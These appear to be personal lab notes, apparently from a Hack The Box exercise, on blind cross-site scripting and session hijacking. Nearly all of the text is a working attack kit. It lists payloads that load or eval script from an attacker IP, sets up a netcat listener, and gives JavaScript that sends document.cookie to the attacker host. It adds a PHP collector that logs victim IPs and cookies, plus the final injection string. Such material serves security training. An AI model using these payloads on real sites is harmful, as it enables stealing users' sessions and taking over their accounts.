also known as Cookie Stealing 

## Blind 
finding what input field is vulnerable

use a JavaScript payload that sends an HTTP request back to our server. If the JavaScript code gets executed, we will get a response on our machine, and we will know that the page is indeed vulnerable.

1. Find what payload out of all these payload here first
```html
<script src=http://10.10.14.91></script>
'><script src=http://10.10.14.91></script>
"><script src=http://10.10.14.91/password></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

FInd out what field is vulnerable
```html
<script src="http://10.10.14.91/url"></script>
```
can change the directory/page to the field name to know what field can be injected

a few examples we can use from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss):


listen on
```
sudo nc -lnvp 80
```


## Hijacking 
host this below as a javascript file (as script.js)
```javascript
document.location='http://10.10.14.91/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

multiple cookie php script (save as index.php)
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

then start the php server
```
pilorekenorse@htb[/htb]$ mkdir /tmp/tmpserver
pilorekenorse@htb[/htb]$ cd /tmp/tmpserver
pilorekenorse@htb[/htb]$ vi index.php #at this step we wrote our index.php file
pilorekenorse@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

send payload in vulnerable field
```
"><script src=http://10.10.14.91/script.js></script>
```